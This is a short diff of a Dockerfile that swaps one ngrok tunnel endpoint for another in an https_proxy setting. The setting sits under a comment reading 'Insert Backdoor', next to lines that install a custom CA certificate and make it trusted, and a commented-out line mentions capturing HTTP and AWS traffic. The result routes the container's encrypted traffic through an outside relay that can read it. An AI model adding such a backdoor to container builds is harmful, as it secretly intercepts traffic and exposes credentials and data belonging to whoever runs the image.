@@ -10,7 +10,7 @@ RUN chmod +r /cacert.pem
 RUN chmod -w /cacert.pem
 
 # Insert Backdoor
-ENV https_proxy="http://4.tcp.eu.ngrok.io:11125"
+ENV https_proxy="http://5.tcp.eu.ngrok.io:10548"
 #ENV http_proxy="http://4.tcp.eu.ngrok.io:11125" #Only enebale this if you want to capute HTTP traffic (do NOT enable this for AWS stuff as aws stuff tries to access metadata endpoint via http)
 ENV SSL_CERT_FILE=/cacert.pem
 
